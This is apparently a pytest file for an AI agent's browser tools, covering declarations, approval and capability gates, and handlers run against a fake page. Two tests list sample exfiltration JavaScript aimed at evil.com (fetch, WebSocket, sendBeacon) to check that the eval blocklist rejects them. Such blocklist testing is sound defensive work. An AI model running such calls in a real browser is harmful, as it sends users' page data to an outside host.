"""Browser operation tools (Phase A1): declarations + approval/capability gates.

The tools wrap a shared playwright page.  Tests pin the declaration contract
(8 tools, correct schema/capabilities/danger), the approval policy (eval is the
only ASK; navigate/state/extract/screenshot auto-ALLOW), the capability gate,
and the handler behaviour against a fake page — no real Chrome is launched.
"""

from __future__ import annotations

import pytest

from modus.config import ModusConfig
from modus.policy.approval import ApprovalDecision, ApprovalPolicy
from modus.tools.base import ToolContext, ToolResult
from modus.tools.browser import (
    _EVAL_BLOCKLIST,
    _bound_eval_source,
    browser_click,
    browser_close,
    browser_eval,
    browser_extract,
    browser_navigate,
    browser_screenshot,
    browser_state,
    browser_type,
)
from modus.tools.builtins import get_builtin_tools


# ── declaration contract ──


def test_browser_tools_declared():
    tools = {tool.name: tool for tool in get_builtin_tools()}
    for name in (
        "browser_navigate", "browser_state", "browser_extract",
        "browser_screenshot", "browser_click", "browser_type",
        "browser_eval", "browser_close",
    ):
        assert name in tools, f"{name} missing from get_builtin_tools()"


def test_browser_tools_share_exec_network_and_are_serial():
    tools = {tool.name: tool for tool in get_builtin_tools()}
    for name in ("browser_navigate", "browser_state", "browser_extract",
                 "browser_screenshot", "browser_click", "browser_type",
                 "browser_eval", "browser_close"):
        tool = tools[name]
        assert tool.capabilities == ("exec", "network"), f"{name} capabilities"
        assert tool.is_concurrency_safe is False, f"{name} must be serial (shared page)"


def test_browser_navigate_metadata_contract():
    """browser_navigate sets metadata.preview_url for the desktop preview iframe."""
    tools = {tool.name: tool for tool in get_builtin_tools()}
    # The contract is enforced by the handler; pin the declaration exists.
    assert "url" in tools["browser_navigate"].parameters["properties"]
    assert "url" in tools["browser_navigate"].required_keys


def test_browser_eval_is_the_only_approval_gated_tool():
    tools = {tool.name: tool for tool in get_builtin_tools()}
    gated = [name for name in (
        "browser_navigate", "browser_state", "browser_extract",
        "browser_screenshot", "browser_click", "browser_type",
        "browser_eval", "browser_close",
    ) if tools[name].requires_approval]
    assert gated == ["browser_eval"]


# ── approval policy ──


def test_browser_read_tools_auto_allow():
    tools = {tool.name: tool for tool in get_builtin_tools()}
    policy = ApprovalPolicy(ModusConfig().policy)
    for name in ("browser_navigate", "browser_state", "browser_extract", "browser_screenshot"):
        assert policy.evaluate(tools[name]) is ApprovalDecision.ALLOW, name


def test_browser_eval_asks_approval():
    tools = {tool.name: tool for tool in get_builtin_tools()}
    policy = ApprovalPolicy(ModusConfig().policy)
    assert policy.evaluate(tools["browser_eval"]) is ApprovalDecision.ASK


# ── capability gate ──


def test_browser_tools_denied_without_network_grant():
    from modus.tools.capabilities import capabilities_granted

    # Without network in the grant, every browser tool is denied first.
    assert capabilities_granted(("exec", "network"), ["exec"]) is False
    assert capabilities_granted(("exec", "network"), ["exec", "network"]) is True


# ── browser_eval security boundary ──


def test_eval_blocklist_rejects_exfiltration():
    for source in (
        "fetch('https://evil.com')",
        "new XMLHttpRequest()",
        "new WebSocket('ws://evil.com')",
        "navigator.sendBeacon('https://evil.com', data)",
    ):
        with pytest.raises(ValueError):
            _bound_eval_source(source)


def test_eval_blocklist_allows_harmless_js():
    _bound_eval_source("document.title")
    _bound_eval_source("document.querySelectorAll('a').length")


def test_eval_blocklist_tokens_are_literal():
    assert "fetch(" in _EVAL_BLOCKLIST


# ── handler behaviour against a fake page ──


class _FakePage:
    """Minimal page double with the surface browser.py uses."""

    def __init__(self):
        self.url = "about:blank"

    async def goto(self, url, **kw):
        self.url = url
        return None

    async def title(self):
        return "Fake Title"

    async def eval_on_selector_all(self, selector, js, *args):
        if "a[href]" in selector:
            return [{"text": "Home", "href": "http://localhost:3000/"}]
        if "input" in selector or "textarea" in selector:
            return [{"tag": "input", "type": "text", "placeholder": "Search", "name": "q"}]
        return ["hello world"]

    async def click(self, selector, **kw):
        return None

    async def fill(self, selector, text, **kw):
        return None

    async def evaluate(self, js):
        return "eval-result"

    async def screenshot(self, **kw):
        return b"\x89PNG-fake-bytes"


@pytest.fixture
def fake_browser(monkeypatch):
    import modus.tools.browser as b

    monkeypatch.setattr(b, "_ensure_browser", lambda: _make_fake_page())
    return b


async def _make_fake_page():
    return _FakePage()


@pytest.mark.asyncio
async def test_navigate_sets_preview_url(fake_browser):
    ctx = ToolContext(cwd=".", config=ModusConfig())
    result = await fake_browser.browser_navigate({"url": "http://localhost:3000/"}, ctx)
    assert not result.is_error
    assert result.metadata["preview_url"] == "http://localhost:3000/"
    assert result.metadata["operation"] == "browser_navigate"


@pytest.mark.asyncio
async def test_navigate_requires_url(fake_browser):
    ctx = ToolContext(cwd=".", config=ModusConfig())
    result = await fake_browser.browser_navigate({}, ctx)
    assert result.is_error
    assert "url" in result.content


@pytest.mark.asyncio
async def test_state_returns_links_and_inputs(fake_browser):
    ctx = ToolContext(cwd=".", config=ModusConfig())
    result = await fake_browser.browser_state({}, ctx)
    assert not result.is_error
    assert "Home" in result.content
    assert "Search" in result.content


@pytest.mark.asyncio
async def test_extract_returns_text(fake_browser):
    ctx = ToolContext(cwd=".", config=ModusConfig())
    result = await fake_browser.browser_extract({"selector": "p", "limit": 5}, ctx)
    assert not result.is_error
    assert "hello world" in result.content


@pytest.mark.asyncio
async def test_eval_runs_and_blocks_exfil(fake_browser):
    ctx = ToolContext(cwd=".", config=ModusConfig())
    result = await fake_browser.browser_eval({"js": "document.title"}, ctx)
    assert not result.is_error
    assert "eval-result" in result.content
    blocked = await fake_browser.browser_eval({"js": "fetch('https://evil.com')"}, ctx)
    assert blocked.is_error
    assert "blocked" in blocked.content


@pytest.mark.asyncio
async def test_screenshot_without_session_is_graceful(fake_browser):
    ctx = ToolContext(cwd=".", config=ModusConfig())  # no session_id/run_id
    result = await fake_browser.browser_screenshot({}, ctx)
    assert not result.is_error
    assert "Screenshot captured" in result.content
    assert result.metadata["operation"] == "browser_screenshot"


@pytest.mark.asyncio
async def test_click_and_type(fake_browser):
    ctx = ToolContext(cwd=".", config=ModusConfig())
    click = await fake_browser.browser_click({"selector": "#submit"}, ctx)
    assert not click.is_error
    typed = await fake_browser.browser_type({"selector": "#q", "text": "hi"}, ctx)
    assert not typed.is_error
    assert typed.metadata["operation"] == "browser_type"


@pytest.mark.asyncio
async def test_close_releases_browser(fake_browser):
    ctx = ToolContext(cwd=".", config=ModusConfig())
    result = await fake_browser.browser_close({}, ctx)
    assert not result.is_error
    assert "Browser closed" in result.content
